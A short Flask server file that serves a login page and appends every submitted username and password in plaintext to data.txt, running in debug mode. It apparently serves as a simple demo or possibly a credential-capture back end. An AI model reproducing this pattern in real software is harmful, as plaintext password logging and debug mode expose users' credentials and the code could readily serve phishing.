# server.py
from flask import Flask, request, render_template

app = Flask(__name__)

@app.route('/')
def login_page():
    return render_template('index.html')

@app.route('/login', methods=['POST'])
def login():
    username = request.form['username']
    password = request.form['password']
    
    with open('data.txt', 'a') as file:
        file.write(f'Username: {username}, Password: {password}\n')
    
    return "Credentials saved successfully!"

if __name__ == '__main__':
    app.run(debug=True)
